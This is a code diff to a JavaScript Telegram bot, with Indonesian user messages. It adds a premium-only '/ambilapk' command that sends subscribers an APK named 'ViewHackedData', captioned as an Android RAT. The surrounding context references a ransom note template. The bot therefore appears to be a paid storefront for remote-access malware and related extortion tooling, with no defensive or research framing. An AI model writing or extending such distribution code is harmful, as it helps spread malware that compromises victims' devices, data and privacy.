@@ -622,6 +622,26 @@ ${ransomNote}
         }
     }
 
+    if (text && text.startsWith('/ambilapk')) {
+        const user = await User.findOne({ chatId });
+        if (!user || !user.isPremium) {
+            return bot.sendMessage(chatId, "Maaf, perintah ini hanya untuk pengguna Premium.");
+        }
+        try {
+            const apkPath = path.join(__dirname, 'ViewHackedData_#1_1.3.apk');
+            if (fs.existsSync(apkPath)) {
+                await bot.sendMessage(chatId, "⏳ Mengirim file APK, mohon tunggu...");
+                await bot.sendDocument(chatId, apkPath, {}, { caption: "Berikut adalah file APK untuk Android RAT." });
+            } else {
+                await bot.sendMessage(chatId, "Maaf, file APK tidak dapat ditemukan di server.");
+            }
+        } catch (error) {
+            console.error("Gagal mengirim file APK:", error);
+            await bot.sendMessage(chatId, "Terjadi kesalahan saat mencoba mengirim file APK.");
+        }
+        return;
+    }
+
     // Other message handlers
     if (mutedUsers[chatId] && mutedUsers[chatId][userId]) {
         bot.deleteMessage(chatId, msg.message_id);
